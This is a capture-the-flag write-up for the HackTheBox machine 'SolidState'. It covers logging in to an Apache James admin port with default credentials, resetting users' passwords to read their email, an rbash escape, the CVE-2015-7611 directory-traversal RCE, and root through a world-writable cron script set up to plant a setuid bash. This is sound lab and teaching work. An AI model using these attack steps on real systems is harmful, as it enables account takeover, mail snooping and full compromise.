# HackTheBox — SolidState

**Platform:** HackTheBox  
**Difficulty:** Medium  
**OS:** Linux  
**Category:** Mail Server / Apache James RCE / Cron Job  
**Status:** Retired  

---

## Summary

SolidState runs an Apache James mail server with default admin credentials. Reading user emails reveals SSH credentials, and a known RCE exploit (CVE-2015-7611) backdoors a new user to execute code on login. Privilege escalation abuses a world-writable Python script executed by root via cron.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/solidstate 10.10.10.51
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1
25/tcp  open  smtp    JAMES smtpd 2.3.2
80/tcp  open  http    Apache httpd 2.4.25
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd
4555/tcp open  rsip?  (Apache James Remote Admin)
```

Port 4555 is Apache James Remote Administration Tool.

---

## Enumeration

### Apache James Admin — Default Credentials

```bash
nc 10.10.10.51 4555
# Username: root
# Password: root
```

Logged in. List users:

```
listusers
```

```
Existing accounts:
james
thomas
john
mindy
mailadmin
```

### Reset Passwords & Read Emails

```bash
setpassword mindy password123
setpassword john  password123
```

Connect to POP3 for each user:

```bash
openssl s_client -connect 10.10.10.51:110
# or plain:
nc 10.10.10.51 110
USER mindy
PASS password123
LIST
RETR 1
RETR 2
```

**mindy's email 2** contains SSH credentials:

```
Username: mindy
Password: P@55W0rd1!2@
```

---

## Exploitation

### Method 1: SSH with Found Credentials

```bash
ssh mindy@10.10.10.51
# P@55W0rd1!2@
```

Limited shell (rbash). Escape with:

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

### Method 2: CVE-2015-7611 — Apache James 2.3.2 RCE

This exploit creates a new user with a malicious home directory name. When James processes mail to that user, it writes the email to a path that traverses into `/etc/bash_completion.d/` (or similar auto-executed locations).

```bash
# Via admin panel (port 4555):
adduser ../../../../../../../../etc/bash_completion.d exploit

# Send a crafted email to trigger code execution:
# The "To:" address triggers the file write
```

Pre-built exploit:

```bash
python james_exploit.py 10.10.10.51
```

When a user SSH's in and bash_completion is sourced, the injected command executes.

---

## User Flag

```bash
cat /home/mindy/user.txt
```

---

## Privilege Escalation

### Finding the Cron Job

```bash
# Using pspy to monitor processes
./pspy64
```

Every few minutes:

```
/bin/sh -c python /opt/tmp.py
```

### Check Permissions

```bash
ls -la /opt/tmp.py
# -rwxrwxrwx 1 root root ... /opt/tmp.py
```

World-writable! Overwrite it:

```bash
echo "import os; os.system('chmod +s /bin/bash')" > /opt/tmp.py
```

Wait for the cron:

```bash
/bin/bash -p
whoami
# root
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- Default credentials on admin ports (`root:root`) are surprisingly common — always try them
- Mail servers store emails containing credentials — read all mailboxes you can access
- Apache James 2.3.2 directory traversal during user creation is a creative RCE vector
- **pspy** is essential for finding cron jobs running as root without needing root access
- World-writable scripts executed by root cron jobs are immediate privilege escalation paths

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| netcat | Apache James admin access |
| openssl / nc | POP3 email reading |
| ssh | Remote access |
| pspy | Process monitoring |
| Python | Cron exploit payload |
